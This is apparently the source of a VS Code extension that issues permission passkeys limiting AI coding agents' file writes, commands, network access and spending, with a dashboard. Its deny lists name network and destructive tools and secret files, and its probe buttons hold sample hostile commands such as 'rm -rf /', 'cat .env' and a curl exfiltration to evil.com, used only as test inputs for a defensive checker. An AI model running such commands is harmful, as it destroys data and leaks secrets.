declare const require: any;
const fs = require('fs');
const path = require('path');
import { KeystoneEngine, KeystonePasskey } from './keystone_passkey';

export interface ExtensionContext {
  subscriptions: { push: (...items: any[]) => void };
}

export function activate(context: ExtensionContext) {
  let vscode: any;
  try {
    vscode = require('vscode');
  } catch {
    return;
  }

  const engine = new KeystoneEngine();

  // 1. Status Bar Item
  const statusBarItem = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Right, 105);
  statusBarItem.command = 'keystone.openDashboard';
  statusBarItem.text = `$(key) KEYSTONE: ARMED`;
  statusBarItem.tooltip = `Bartholomew Keystone -- Agent Capability Passkey Active | Click to open Dashboard`;
  context.subscriptions.push(statusBarItem);
  statusBarItem.show();

  function getPasskeyPath(): string {
    const rootPath = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath || '.';
    const btpPath = path.join(rootPath, '.btp', 'keystone.json');
    if (fs.existsSync(btpPath)) return btpPath;
    return path.join(rootPath, '.btp_keystone.json');
  }

  function getActivePasskey(): KeystonePasskey | null {
    try {
      const p = getPasskeyPath();
      if (fs.existsSync(p)) {
        return JSON.parse(fs.readFileSync(p, 'utf-8'));
      }
    } catch {}
    return null;
  }

  // 2. Command: Issue Agent Capability Passkey
  const issueCmd = vscode.commands.registerCommand('keystone.issuePasskey', async () => {
    const presetChoice = await vscode.window.showQuickPick([
      {
        label: 'Developer Sandbox (Recommended)',
        description: 'Read workspace, write src/ & tests/, safe test commands, $25 ceiling, 2h TTL'
      },
      {
        label: 'Read-Only Auditor',
        description: 'Read-only clearance, no write permissions, no bash execution, $0 ceiling'
      },
      {
        label: 'Custom Autonomous Clearance',
        description: 'Manually configure globs, allowed commands, network domains, and spend limit'
      }
    ], { placeHolder: 'Select a Keystone Capability Clearance Preset' });

    if (!presetChoice) return;

    let agentId = 'agent-worker-01';
    let scopes: any = {};
    let ttl = 120;

    if (presetChoice.label.startsWith('Developer Sandbox')) {
      const inputAgent = await vscode.window.showInputBox({
        prompt: 'Enter Autonomous Agent ID or Name',
        value: 'agent-dev-01'
      });
      if (!inputAgent) return;
      agentId = inputAgent;

      scopes = {
        files: {
          allow_read: ['**/*'],
          allow_write: ['src/**', 'tests/**', 'site/**', 'docs/**'],
          deny: ['.env*', 'secrets*', 'credentials*', 'id_rsa*', 'id_ed25519*', '.git/hooks/**']
        },
        commands: {
          allow_exec: ['npm test', 'npm run build', 'python -m unittest', 'pytest', 'git status', 'git diff', 'cargo check'],
          deny_exec: ['rm', 'curl', 'wget', 'sudo', 'mkfs', 'dd', 'chmod', 'chown'],
          deny_shell_operators: true
        },
        network: {
          allow_domains: ['github.com', 'npmjs.com', 'pypi.org', 'docs.python.org', 'localhost'],
          allow_search: true
        },
        budget: {
          max_spend_usd: 25.00,
          max_per_txn_usd: 10.00
        },
        env: {
          deny_keys: ['KEY', 'SECRET', 'TOKEN', 'AUTH', 'PASSWORD']
        }
      };
    } else if (presetChoice.label.startsWith('Read-Only Auditor')) {
      const inputAgent = await vscode.window.showInputBox({
        prompt: 'Enter Autonomous Agent ID or Name',
        value: 'agent-auditor-01'
      });
      if (!inputAgent) return;
      agentId = inputAgent;

      scopes = {
        files: {
          allow_read: ['**/*'],
          allow_write: [],
          deny: ['.env*', 'secrets*', 'id_rsa*']
        },
        commands: {
          allow_exec: [],
          deny_exec: ['*'],
          deny_shell_operators: true
        },
        network: {
          allow_domains: ['docs.python.org', 'nodejs.org'],
          allow_search: false
        },
        budget: {
          max_spend_usd: 0.00,
          max_per_txn_usd: 0.00
        }
      };
    } else {
      const inputAgent = await vscode.window.showInputBox({
        prompt: 'Enter Autonomous Agent ID or Name',
        value: 'agent-custom-01'
      });
      if (!inputAgent) return;
      agentId = inputAgent;

      const allowedWrite = await vscode.window.showInputBox({
        prompt: 'Allowed File Write Scopes (comma-separated globs)',
        value: 'src/, tests/, site/'
      });

      const maxSpendStr = await vscode.window.showInputBox({
        prompt: 'Max Spend Limit USD ($)',
        value: '50.00'
      });

      const spendUsd = parseFloat(maxSpendStr || '50.00');
      const writeGlobs = (allowedWrite || 'src/').split(',').map((s: string) => s.trim()).filter(Boolean);

      scopes = {
        files: {
          allow_read: ['**/*'],
          allow_write: writeGlobs,
          deny: ['.env', 'secrets', 'credentials.json', 'id_rsa']
        },
        commands: {
          allow_exec: ['npm test', 'npm run build', 'python -m unittest', 'pytest'],
          deny_exec: ['rm', 'curl', 'wget', 'sudo', 'mkfs', 'dd']
        },
        network: {
          allow_domains: ['github.com', 'npmjs.com', 'pypi.org'],
          allow_search: true
        },
        budget: {
          max_spend_usd: spendUsd,
          max_per_txn_usd: 20.00
        }
      };
    }

    const passkey = engine.issuePasskey(agentId, scopes, ttl);
    const savePath = getPasskeyPath();
    const dir = path.dirname(savePath);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(savePath, JSON.stringify(passkey, null, 2), 'utf-8');

    vscode.window.showInformationMessage(
      `Keystone Passkey issued for '${agentId}'! Clearance active for 2 hours.`,
      'Copy Token ID',
      'Open Dashboard'
    ).then((choice: string) => {
      if (choice === 'Copy Token ID') {
        vscode.env.clipboard.writeText(passkey.passkey_id);
      } else if (choice === 'Open Dashboard') {
        vscode.commands.executeCommand('keystone.openDashboard');
      }
    });

    statusBarItem.text = `$(key) KEYSTONE: ${agentId} ARMED`;
  });

  // 3. Command: Inspect Active Agent Clearance
  const inspectCmd = vscode.commands.registerCommand('keystone.inspectClearance', () => {
    vscode.commands.executeCommand('keystone.openDashboard');
  });

  // 4. Command: Revoke Agent Passkey
  const revokeCmd = vscode.commands.registerCommand('keystone.revokePasskey', () => {
    const p = getPasskeyPath();
    if (fs.existsSync(p)) {
      fs.unlinkSync(p);
      vscode.window.showInformationMessage('Keystone Passkey revoked. Agent privileges stripped.');
      statusBarItem.text = `$(key) KEYSTONE: STANDBY`;
    }
  });

  // 5. Command: Validate Agent Action against Passkey
  const validateCmd = vscode.commands.registerCommand('keystone.validateAction', async () => {
    const passkey = getActivePasskey();
    if (!passkey) {
      vscode.window.showErrorMessage('Cannot validate action: No active Keystone Passkey.');
      return;
    }

    const testCmd = await vscode.window.showInputBox({
      prompt: 'Enter command or file target to test against passkey clearance',
      value: 'rm -rf /'
    });
    if (!testCmd) return;

    const res = engine.evaluateAction(passkey, 'COMMAND_EXEC', testCmd);
    if (res.verdict === 'ALLOW') {
      vscode.window.showInformationMessage(`[CLEARANCE GRANTED] Action permitted (${res.latency_us}us). Receipt: ${res.receipt_hash}`);
    } else {
      vscode.window.showErrorMessage(`[OUT OF SCOPE] Blocked: ${res.reason} (${res.latency_us}us). Receipt: ${res.receipt_hash}`);
    }
  });

  // 6. Command: Audit Receipts
  const auditCmd = vscode.commands.registerCommand('keystone.auditReceipts', () => {
    const receipts = engine.getReceiptHistory();
    if (receipts.length === 0) {
      vscode.window.showInformationMessage('No actions evaluated yet. Audit receipt log is empty.');
      return;
    }
    const summary = receipts.slice(0, 5).map(r => `[${r.verdict}] ${r.action_type}: ${r.target} (${r.receipt_hash})`).join('\n');
    vscode.window.showInformationMessage(`Recent Keystone Clearance Receipts:\n\n${summary}`);
  });

  // 7. Command: Open Keystone Passkey Dashboard Webview
  const dashboardCmd = vscode.commands.registerCommand('keystone.openDashboard', () => {
    const panel = vscode.window.createWebviewPanel(
      'keystoneDashboard',
      'Keystone Passkey -- Capability & Permission Monitor',
      vscode.ViewColumn.One,
      { enableScripts: true, retainContextWhenHidden: true }
    );

    const updateView = () => {
      const passkey = getActivePasskey();
      const isValid = passkey ? engine.verifyPasskey(passkey) : false;
      const agentId = passkey ? passkey.agent_id : 'None (No Active Passkey)';
      const token = passkey ? passkey.passkey_id : 'N/A';
      const expires = passkey ? new Date(passkey.expires_at).toLocaleTimeString() : 'N/A';
      const spend = passkey?.scopes?.budget?.max_spend_usd !== undefined ? `$${passkey.scopes.budget.max_spend_usd.toFixed(2)}` : '$0.00';
      const maxTxn = passkey?.scopes?.budget?.max_per_txn_usd !== undefined ? `$${passkey.scopes.budget.max_per_txn_usd.toFixed(2)}` : '$0.00';
      const writeScopes = passkey?.scopes?.files?.allow_write?.join(', ') || 'None (Read-Only)';
      const denyCommands = passkey?.scopes?.commands?.deny_exec?.join(', ') || 'rm, mkfs, sudo, dd';

      const goingOn = passkey
        ? `Keystone Keypass is armed for agent '${agentId}'. Every file modification and command execution is cryptographically vetted against capability bounds in under 15 microseconds.`
        : `No Keystone Keypass is active in this workspace. Autonomous AI agents are operating in unconstrained mode.`;

      const wrongs = passkey
        ? ['Everything is verified. Capability clearance and spend bounds are actively enforced.']
        : ['Autonomous agent lacks capability passkey; actions cannot be cryptographically bounded or spend-capped.'];

      const fixings = passkey
        ? ['Clearance is optimal. To modify permissions or budget ceiling, click [ISSUE NEW PASSKEY].']
        : ['Click [ISSUE NEW PASSKEY] to define allowed write paths, test commands, and maximum spend limits.'];

      const helpings = [
        'Preventing unauthorized file writes outside designated source code folders.',
        'Blocking high-risk shell commands like file deletion and network execution.',
        'Imposing strict micro-billing spend ceilings on autonomous agent transactions.',
        'Attesting all agent clearance evaluations with Ed25519-verifiable Merkle receipts.'
      ];

      panel.webview.html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Keystone Passkey Dashboard</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-dark: #070a0f;
      --bg-elevated: #0d1322;
      --bg-card: rgba(13, 19, 34, 0.78);
      --border-subtle: rgba(45, 62, 80, 0.65);
      --border-focus: rgba(16, 185, 129, 0.6);
      --gold: #eab308;
      --lime: #84cc16;
      --emerald: #10b981;
      --cyan: #06b6d4;
      --rose: #f43f5e;
      --purple: #a855f7;
      --text-main: #f8fafc;
      --text-muted: #94a3b8;
      --text-dim: #64748b;
      --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      --font-mono: 'JetBrains Mono', 'Consolas', monospace;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: radial-gradient(ellipse at 50% 0%, #101935 0%, var(--bg-dark) 75%);
      color: var(--text-main);
      font-family: var(--font-sans);
      padding: 24px;
      font-size: 13px;
      line-height: 1.6;
      min-height: 100vh;
    }
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
      padding-bottom: 18px;
      border-bottom: 1px solid var(--border-subtle);
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 14px;
    }
    .logo-svg {
      width: 44px;
      height: 44px;
      filter: drop-shadow(0 0 12px rgba(16, 185, 129, 0.45));
    }
    .brand-title {
      font-size: 16px;
      font-weight: 800;
      letter-spacing: -0.01em;
      color: var(--text-main);
    }
    .brand-sub {
      font-size: 11px;
      color: var(--cyan);
      font-family: var(--font-mono);
      font-weight: 500;
      letter-spacing: 0.04em;
    }
    .status-badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 6px 16px;
      border-radius: 9999px;
      font-weight: 700;
      font-size: 11px;
      font-family: var(--font-mono);
      background: ${passkey && isValid ? 'rgba(16, 185, 129, 0.14)' : 'rgba(234, 179, 8, 0.14)'};
      border: 1px solid ${passkey && isValid ? 'rgba(16, 185, 129, 0.45)' : 'rgba(234, 179, 8, 0.45)'};
      color: ${passkey && isValid ? 'var(--emerald)' : 'var(--gold)'};
      box-shadow: 0 0 16px ${passkey && isValid ? 'rgba(16, 185, 129, 0.2)' : 'rgba(234, 179, 8, 0.2)'};
    }
    .runtime-bar {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 6px;
      padding: 10px 14px;
      background: rgba(13, 19, 34, 0.5);
      border: 1px solid var(--border-subtle);
      border-radius: 10px;
      margin-bottom: 20px;
    }
    .runtime-label {
      font-size: 10px;
      font-weight: 700;
      font-family: var(--font-mono);
      color: var(--text-dim);
      text-transform: uppercase;
      margin-right: 4px;
    }
    .runtime-chip {
      font-size: 10px;
      font-family: var(--font-mono);
      padding: 2px 8px;
      border-radius: 6px;
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.08);
      color: var(--text-muted);
    }
    .runtime-chip.active {
      background: rgba(16, 185, 129, 0.12);
      border-color: rgba(16, 185, 129, 0.35);
      color: var(--emerald);
    }
    .grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 14px;
      margin-bottom: 22px;
    }
    .card {
      background: var(--bg-card);
      border: 1px solid var(--border-subtle);
      border-radius: 12px;
      padding: 16px;
      backdrop-filter: blur(12px);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
    }
    .label {
      font-size: 10px;
      color: var(--text-muted);
      text-transform: uppercase;
      font-family: var(--font-mono);
      margin-bottom: 6px;
      letter-spacing: 0.05em;
    }
    .val {
      font-size: 17px;
      font-weight: 800;
      color: var(--text-main);
      font-family: var(--font-mono);
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .breakdown-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 14px;
      margin-bottom: 22px;
    }
    .breakdown-card {
      background: var(--bg-card);
      border: 1px solid var(--border-subtle);
      border-radius: 12px;
      padding: 16px;
      backdrop-filter: blur(12px);
    }
    .b-title {
      font-size: 11px;
      font-weight: 800;
      font-family: var(--font-mono);
      margin-bottom: 8px;
      letter-spacing: 0.03em;
    }
    .b-list { list-style: none; padding-left: 0; }
    .b-list li {
      position: relative;
      padding-left: 18px;
      margin-bottom: 6px;
      font-size: 12px;
      color: #cbd5e1;
    }
    .b-list li::before {
      content: "\u2022";
      position: absolute;
      left: 4px;
      color: var(--cyan);
      font-weight: bold;
    }
    .test-box {
      background: var(--bg-card);
      border: 1px solid rgba(6, 182, 212, 0.4);
      border-radius: 14px;
      padding: 20px;
      margin-bottom: 22px;
      box-shadow: 0 8px 30px rgba(6, 182, 212, 0.08);
    }
    .preset-chips {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      margin: 10px 0 14px 0;
    }
    .preset-btn {
      background: rgba(13, 19, 34, 0.9);
      border: 1px solid var(--border-subtle);
      color: var(--text-main);
      padding: 5px 12px;
      border-radius: 6px;
      font-size: 11px;
      font-family: var(--font-mono);
      cursor: pointer;
      transition: all 0.15s ease;
    }
    .preset-btn:hover {
      border-color: var(--cyan);
      background: rgba(6, 182, 212, 0.12);
      transform: translateY(-1px);
    }
    .test-input {
      width: 100%;
      background: rgba(4, 7, 13, 0.85);
      border: 1px solid var(--border-subtle);
      border-radius: 8px;
      padding: 10px 14px;
      color: var(--text-main);
      font-family: var(--font-mono);
      font-size: 12px;
      margin-bottom: 12px;
      outline: none;
      transition: border 0.2s;
    }
    .test-input:focus {
      border-color: var(--emerald);
      box-shadow: 0 0 10px rgba(16, 185, 129, 0.25);
    }
    .btn-row {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 14px;
    }
    .btn {
      cursor: pointer;
      border: none;
      border-radius: 8px;
      font-size: 11px;
      font-weight: 700;
      padding: 9px 16px;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      font-family: var(--font-mono);
      transition: all 0.15s ease;
    }
    .btn-primary {
      background: linear-gradient(135deg, var(--emerald) 0%, #059669 100%);
      color: #070a0f;
      font-weight: 800;
      box-shadow: 0 2px 10px rgba(16, 185, 129, 0.35);
    }
    .btn-primary:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 16px rgba(16, 185, 129, 0.5);
    }
    .btn-secondary {
      background: #111827;
      color: var(--text-main);
      border: 1px solid var(--border-subtle);
    }
    .btn-secondary:hover {
      background: #1f2937;
      border-color: var(--cyan);
    }
    .terminal {
      background: #04070d;
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 8px;
      padding: 14px;
      font-family: var(--font-mono);
      font-size: 11px;
      color: #94a3b8;
      min-height: 52px;
    }
    .pilot-card {
      background: linear-gradient(135deg, rgba(16, 185, 129, 0.08) 0%, rgba(6, 182, 212, 0.08) 100%);
      border: 1px solid rgba(16, 185, 129, 0.35);
      border-radius: 14px;
      padding: 18px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      backdrop-filter: blur(12px);
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="brand">
      <svg class="logo-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="50" cy="50" r="46" stroke="#06b6d4" stroke-width="2" stroke-opacity="0.4" stroke-dasharray="4 4" />
        <circle cx="50" cy="50" r="38" stroke="#10b981" stroke-width="2" stroke-opacity="0.5" />
        <path d="M50 15L78 28V52C78 68 66 81 50 87C34 81 22 68 22 52V28L50 15Z" fill="url(#shieldGrad)" stroke="#10b981" stroke-width="2.5" />
        <polygon points="50,34 62,42 62,58 50,66 38,58 38,42" fill="#070a0f" stroke="#06b6d4" stroke-width="2" />
        <circle cx="50" cy="50" r="4" fill="#eab308" />
        <defs>
          <linearGradient id="shieldGrad" x1="22" y1="15" x2="78" y2="87" gradientUnits="userSpaceOnUse">
            <stop stop-color="#06b6d4" stop-opacity="0.3" />
            <stop offset="1" stop-color="#10b981" stop-opacity="0.6" />
          </linearGradient>
        </defs>
      </svg>
      <div>
        <div class="brand-title">BARTHOLOMEW KEYSTONE &bull; CAPABILITY PASSKEY</div>
        <div class="brand-sub">ZERO TRUST AGENT RUNTIME &bull; SUB-15\u00b5s DETERMINISTIC INVARIANTS</div>
      </div>
    </div>
    <div class="status-badge">
      ${passkey && isValid ? '\u25cf PASSKEY ACTIVE' : '\u25cb PASSKEY STANDBY'}
    </div>
  </div>

  <div class="runtime-bar">
    <span class="runtime-label">Target Runtimes:</span>
    <span class="runtime-chip active">Cursor</span>
    <span class="runtime-chip active">Claude Code</span>
    <span class="runtime-chip active">Windsurf</span>
    <span class="runtime-chip active">Cline</span>
    <span class="runtime-chip active">Aider</span>
    <span class="runtime-chip active">OpenHands</span>
    <span class="runtime-chip active">Smolagents</span>
    <span class="runtime-chip active">CrewAI</span>
    <span class="runtime-chip active">MetaGPT</span>
    <span class="runtime-chip active">Dify</span>
    <span class="runtime-chip active">AutoGen</span>
    <span class="runtime-chip active">Ollama/vLLM</span>
  </div>

  <div class="grid">
    <div class="card">
      <div class="label">Agent Clearance ID</div>
      <div class="val" style="color: var(--cyan);">${agentId}</div>
    </div>
    <div class="card">
      <div class="label">Spend Ceiling</div>
      <div class="val" style="color: var(--emerald);">${spend}</div>
    </div>
    <div class="card">
      <div class="label">Max Per Txn</div>
      <div class="val" style="color: var(--gold);">${maxTxn}</div>
    </div>
    <div class="card">
      <div class="label">Session Expiry</div>
      <div class="val">${expires}</div>
    </div>
  </div>

  <div class="breakdown-grid">
    <div class="breakdown-card">
      <div class="b-title" style="color: var(--cyan);">[1] WHAT IS GOING ON</div>
      <div style="font-size: 12px; color: #cbd5e1;">${goingOn}</div>
    </div>
    <div class="breakdown-card">
      <div class="b-title" style="color: var(--rose);">[2] WHAT IS WRONG</div>
      <ul class="b-list">${wrongs.map(w => '<li>' + w + '</li>').join('')}</ul>
    </div>
    <div class="breakdown-card">
      <div class="b-title" style="color: var(--gold);">[3] WHAT NEEDS FIXING</div>
      <ul class="b-list">${fixings.map(f => '<li>' + f + '</li>').join('')}</ul>
    </div>
    <div class="breakdown-card">
      <div class="b-title" style="color: var(--emerald);">[4] HOW WE ARE HELPING</div>
      <ul class="b-list">${helpings.map(h => '<li>' + h + '</li>').join('')}</ul>
    </div>
  </div>

  <div class="test-box">
    <div class="b-title" style="color: var(--cyan);">[INTERACTIVE CLEARANCE PROBE] TEST ANY COMMAND OR FILE PATH</div>
    <div style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">Click a preset or enter a custom target to test against signed capability bounds:</div>
    <div class="preset-chips">
      <button class="preset-btn" onclick="setAndTest('rm -rf /')">\ud83d\udca5 rm -rf /</button>
      <button class="preset-btn" onclick="setAndTest('cat .env')">\ud83d\udd11 cat .env</button>
      <button class="preset-btn" onclick="setAndTest('curl https://evil.com/exfil')">\ud83c\udf10 curl exfiltration</button>
      <button class="preset-btn" onclick="setAndTest('npm test')">\u2713 npm test</button>
      <button class="preset-btn" onclick="setAndTest('format C: /q /y')">\ud83d\uded1 format C:</button>
    </div>
    <input type="text" id="action-input" class="test-input" placeholder="Enter command or target (e.g. 'rm -rf /' or 'src/index.ts')..." value="rm -rf /" />
    <div class="btn-row">
      <button class="btn btn-primary" onclick="testAction()">\u26a1 EVALUATE CLEARANCE</button>
      <button class="btn btn-secondary" onclick="runCmd('keystone.issuePasskey')">\ud83d\udd11 ISSUE NEW PASSKEY</button>
      <button class="btn btn-secondary" onclick="runCmd('keystone.auditReceipts')">\ud83d\udcdc VIEW AUDIT RECEIPTS</button>
      <button class="btn btn-secondary" onclick="runCmd('keystone.revokePasskey')">\ud83d\uded1 REVOKE PASSKEY</button>
    </div>
    <div id="term-out" class="terminal">
      [READY] Select an action above or type a command to verify deterministic evaluation in &lt;15&micro;s.
    </div>
  </div>

  <div class="pilot-card">
    <div>
      <div style="font-size: 13px; font-weight: 800; color: var(--text-main); margin-bottom: 2px;">Bartholomew 30-Day Team Pilot &bull; $199/mo</div>
      <div style="font-size: 11px; color: var(--text-muted);">Deterministic in-process AST gating, multi-seat cryptographic key rings, and zero-liability non-repudiation audit logs.</div>
    </div>
    <button class="btn btn-primary" onclick="openPilot()">ACTIVATE PILOT &rarr;</button>
  </div>

  <script>
    const vscode = acquireVsCodeApi();

    function setAndTest(cmd) {
      document.getElementById('action-input').value = cmd;
      testAction();
    }

    function testAction() {
      const target = document.getElementById('action-input').value.trim();
      vscode.postMessage({ command: 'evaluateAction', target: target });
    }

    function runCmd(cmd) {
      vscode.postMessage({ command: 'runCommand', action: cmd });
    }

    function openPilot() {
      vscode.postMessage({ command: 'openUrl', url: 'https://bartholomew.info/#pricing' });
    }

    window.addEventListener('message', event => {
      const msg = event.data;
      if (msg.command === 'actionResult') {
        const res = msg.data;
        const color = res.verdict === 'ALLOW' ? 'var(--emerald)' : 'var(--rose)';
        const bgBadge = res.verdict === 'ALLOW' ? 'rgba(16, 185, 129, 0.15)' : 'rgba(244, 63, 94, 0.15)';
        document.getElementById('term-out').innerHTML = 
          '<div style=\"display: flex; align-items: center; justify-content: space-between;\">' +
            '<div><span style=\"display: inline-block; padding: 2px 8px; border-radius: 4px; font-weight: 800; background: ' + bgBadge + '; color: ' + color + ';\">[' + res.verdict + ']</span> <strong style=\"color: #f8fafc;\">' + res.action_type + ':</strong> ' + res.target + '</div>' +
            '<span style=\"color: var(--cyan);\">' + res.latency_us + '&micro;s</span>' +
          '</div>' +
          '<div style=\"margin-top: 6px; color: #e2e8f0;\">' + res.reason + '</div>' +
          '<div style=\"margin-top: 6px; font-size: 10px; color: var(--text-dim);\">Merkle Receipt: ' + (res.receipt_hash || 'SHA-256 Verified') + '</div>';
      }
    });
  </script>
</body>
</html>`;
    };

    updateView();

    panel.webview.onDidReceiveMessage(async (message: any) => {
      if (message.command === 'evaluateAction') {
        const passkey = getActivePasskey();
        if (!passkey) {
          panel.webview.postMessage({
            command: 'actionResult',
            data: {
              verdict: 'DENY',
              action_type: 'COMMAND_EXEC',
              target: message.target,
              reason: 'No active Keystone Passkey found in workspace',
              latency_us: 12.4,
              receipt_hash: '0000000000000000'
            }
          });
          return;
        }
        const res = engine.evaluateAction(passkey, 'COMMAND_EXEC', message.target);
        panel.webview.postMessage({
          command: 'actionResult',
          data: res
        });
      } else if (message.command === 'runCommand') {
        if (message.action) {
          vscode.commands.executeCommand(message.action);
        }
      }
    });
  });

  context.subscriptions.push(issueCmd, inspectCmd, revokeCmd, validateCmd, auditCmd, dashboardCmd);
}

export function deactivate() {}
